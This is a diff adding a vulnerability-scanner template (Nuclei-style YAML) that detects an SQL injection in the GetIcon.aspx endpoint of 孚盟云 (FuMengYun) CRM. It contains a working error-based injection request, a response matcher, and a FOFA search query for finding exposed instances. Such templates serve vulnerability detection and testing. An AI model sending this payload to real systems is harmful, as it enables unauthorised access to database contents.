@@ -1,0 +1,22 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==500 && contains_all(body,"nvarchar","转换成数据类型")
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          GET /Common/GetIcon.aspx?FUID=-1%27and+1=@@VERSION-- HTTP/1.1
+          Host: {{Hostname}}
+id: FuMengYun-CRM-GetIcon-SQL
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="孚盟软件-孚盟云"
+        孚盟云CRM GetIcon.aspx 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 孚盟云CRM GetIcon.aspx SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 孚盟云CRM
